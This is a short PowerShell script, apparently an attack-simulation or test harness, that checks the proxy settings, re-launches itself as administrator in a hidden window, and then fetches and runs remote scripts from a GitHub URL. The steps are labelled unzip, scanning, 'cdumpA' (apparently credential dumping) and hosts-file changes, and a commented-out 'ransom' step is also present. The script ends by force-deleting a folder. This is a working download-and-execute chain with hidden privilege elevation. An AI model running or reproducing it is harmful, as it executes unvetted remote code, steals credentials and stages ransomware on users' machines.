if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("AutoConfigURL") -ne $Null)
{
    $wsobj = new-object -comobject wscript.shell
    $result = $wsobj.popup("Do not support Proxy PAC")
    exit
}
if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyEnable") -eq 1)
{
    $wsobj = new-object -comobject wscript.shell
    $result = $wsobj.popup("Use other test file that support manual proxy setting.")
    exit
}

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

#7zip
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/unzip_124509.ps1')"

#scanning
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/scan_124509.ps1')"

#cdumpA
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/cdumpa_124509.ps1')"

#hosts
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/hosts_124509.ps1')"

#ransom
#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object #Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/ransom_124509.ps1')"

Remove-Item C:\CRDemo -Recurse -Force
